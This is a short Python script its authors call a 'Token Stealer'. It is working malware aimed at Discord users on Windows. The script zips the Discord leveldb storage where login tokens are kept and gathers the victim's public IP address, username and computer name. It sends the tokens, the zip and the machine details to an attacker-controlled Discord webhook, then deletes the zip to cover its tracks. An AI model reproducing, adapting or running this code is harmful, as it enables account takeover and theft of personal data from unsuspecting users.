# 1-28-19
# Project: Token Stealer
# Authors: Blakeando10 | Synchronocy
# IDLE 3.6.5 (32/64)
# Essentially uhh. no comment.
# requirements as follows.

# TODO

'''
1. Cause crash so we can generate a logfile. - don't really need to do this anymore
'''
from dhooks import Webhook, File # we can supply this so we can use local file instead of downloading it
import os
import requests
import shutil
from io import BytesIO
dia = 1
path = os.getenv('APPDATA')
tempzipdir = os.getenv('LOCALAPPDATA')+"\\temp\\"+"logs.zip"
userinfo = ''
leveldbdir = "\\discord\\Local Storage\\"
discordloc = leveldbdir+'leveldb\\' 
tokendir = str(path)+str(discordloc)
hook = Webhook('WEBHOOK_LINK_HERE')
logfile = []
zipf = 'lol.zip'

def getinfo():
  src = requests.get('http://checkip.dyndns.org/').text 
  src = '''*** '''+src[76:].replace('</body></html>','').rstrip()+''' ***'''
  username = 'Username: '+os.environ['HOME'].strip('C:\\Users\\') 
  pc_name = 'Computer Name: '+os.environ['COMPUTERNAME']
  userinfo = '''```'''+str(src)+'\n'+username+'\n'+pc_name+'''```'''
  return userinfo


def getlogfiles():
  if os.path.isfile(zipf): # our check if we've already dmped 
    os.remove(zipf)
  try:
    shutil.make_archive('lol', 'zip', tokendir) # create our zip 
  except:
    return ''
  print(tokendir)
  for root, dirs, files in os.walk(tokendir):
    for file in files:
      if '.log' in file:
        logfile.append(file)
      if '.ldb' in file:
        logfile.append(file)

        
def main():
    getlogfiles()
    if dia == 1:
        hook.send('Diagnostics mode initiated!\n')
        hook.send('Token Directory: '+tokendir)
        for x in logfile:
            hook.send('Log File: '+x)
        hook.send('PC Info: '+getinfo())
        hook.send('Zip File:', file = File('./'+zipf, name=zipf)) # Remember whatever location this is installed @ it will attempt to save files here and upload.
    else:
        for x in logfile:
            if logfile != '':
                hook.send('Token Grabbed: '+x)
                for x in logfile:
                  hook.send("Log File('s): "+x)
                hook.send('Zip File:', file = File('./'+zipf, name=zipf)) # Remember whatever location this is installed @ it will attempt to save files here and upload.
                hook.send('PC Info: '+getinfo())
            else:
                hook.send('Failed to grab token.')
                hook.send('PC Info: '+getinfo())
    print('Starting Cleanup')
    try:
      os.remove(zipf)
      print('Removed Our zip')
    except:
      return ''

main()
